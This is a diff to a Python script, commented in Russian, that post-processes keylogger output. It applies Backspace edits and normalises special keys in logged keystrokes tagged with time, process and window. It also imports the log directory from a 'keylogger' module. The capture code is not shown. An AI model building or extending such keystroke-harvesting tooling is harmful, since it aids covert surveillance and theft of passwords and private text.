@@ -1,20 +1,10 @@
 import os
 import re
+from keylogger import get_log_dir
 
-# Путь к директории с логами относительно текущего файла
-LOG_DIR = os.path.join(os.path.dirname(__file__), "logs")
 
 
 def process_line(line: str) -> str:
-    """
-    Обрабатывает одну строку лога, удаляя символы Backspace и нормализуя специальные клавиши.
-
-    Args:
-        line (str): Строка лога для обработки
-
-    Returns:
-        str: Обработанная строка с примененными Backspace и нормализованными специальными клавишами
-    """
     # Отделяем префикс (время + процесс + окно) от содержимого нажатий клавиш
     # Шаблон ищет: время - [процесс] - "окно" - содержимое
     match = re.match(r"^(.*? - \[.*?\] - \".*?\" - )(.*)$", line)
@@ -78,14 +68,30 @@ def process_file(path):
 
 def process_all_logs():
     """
-    Обрабатывает все текстовые файлы логов в директории LOG_DIR.
+    Обрабатывает все текстовые файлы логов в директории logs.
     Выводит прогресс обработки для каждого файла.
     """
-    for filename in os.listdir(LOG_DIR):
-        if filename.endswith(".txt"):  # Обрабатываем только текстовые файлы
-            path = os.path.join(LOG_DIR, filename)
-            print(f"Обработка файла: {filename}")
-            process_file(path)  # Обрабатываем каждый файл
+    # Получаем правильный путь к папке logs
+    log_dir = get_log_dir()
+
+    # Проверяем существует ли папка
+    if not os.path.exists(log_dir):
+        print(f"Log directory does not exist: {log_dir}")
+        return
+
+    # Обрабатываем файлы
+    processed_count = 0
+    for filename in os.listdir(log_dir):
+        if filename.endswith(".txt"):
+            path = os.path.join(log_dir, filename)
+            print(f"Processing file: {filename}")
+            process_file(path)
+            processed_count += 1
+
+    if processed_count == 0:
+        print("No log files found to process")
+    else:
+        print(f"Processed {processed_count} log files")
 
 
 if __name__ == "__main__":
